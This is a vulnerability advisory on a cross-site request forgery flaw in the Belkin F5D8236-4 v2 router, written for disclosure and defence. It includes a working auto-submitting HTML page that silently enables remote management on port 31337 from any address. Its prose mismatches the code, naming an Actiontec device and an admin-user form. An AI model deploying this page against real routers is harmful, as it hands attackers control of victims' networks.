# Taking over the Belkin F5D8236-4 v2

[[return to summary]](../../../casestudies/exploiting-soho-routers/#summary)

## Details

All HTML forms present in the Belkin F5D8236-4 v2 are susceptible to Cross-Site Request Forgery.

## Impact

A successful attack exploiting this vulnerability can give a remote adversary full control of the victim router.

## Recommendations to the vendor

* Cross-Site request forgery can be prevented by including an unpredictable token in each HTTP request submitted to the web server. At a minimum, these tokens should be unique to each user, but it is recommended that each HTML form delivered contain a unique token.
* In addition to HTML form tokens, HTTP refferer checking should be enabled.
* Additional information for vendors regarding immediate and long term fixes for these issues can be found on our summary page [here](../../../casestudies/exploiting-soho-routers/#recommendationsVendors).

## Recommendations to device administrators

* (4/13/2013) There is not currently an available firmware upgrade that will remedy this vulnerability.
* Take additional preventative measures and precautions by following the steps outlined on our summary page [here](../../../casestudies/exploiting-soho-routers/#recommendationsAdmin).

## Proof of Concept

In the following proof of concept attack, we assume that an Actiontec device administrator with an active management session established with the router has browsed to a malicious web page. Once there, a series of automatic form submissions take place, one after the other, to the administrator's router, from the administrator's browser. Since the administrator has a current session established with the Actiontec router, the form submissions are processed.

The first form (Figure 1) is pre-filled out with the information required to add a new administrative user to the router. The form is automatically submitted after a 1 second delay, and the victim's browser is then redirected to a second page.

| ```  <html>  <head> <title>Belkin F5D8236-4 v2 CSRF - Enable Remote MGMT.</title> <!-- Use JavaScript debugging to bypass authentication --> <!--*Discovered by: Jacob Holcomb  	- Security Analyst @ Independent Security Evaluators --> </head>  <body>  <form name="belkin" action="http://X.X.X.X/cgi-bin/system_setting.exe"  	method="post"/> <input type="hidden" name="remote_mgmt_enabled" value="1"/> <input type="hidden" name="remote_mgmt_port" value="31337"/> <input type="hidden" name="allow_remote_ip" value="0"/> </form>  <script> function BeLkIn() {document.belkin.submit();};  window.setTimeout(BeLkIn, 0000); </script>  <body> </html>  ``` |
| --- |

Figure 1. Attack page 1.

At this point, the attacker can remotely administer, and thereby remotely control the router.
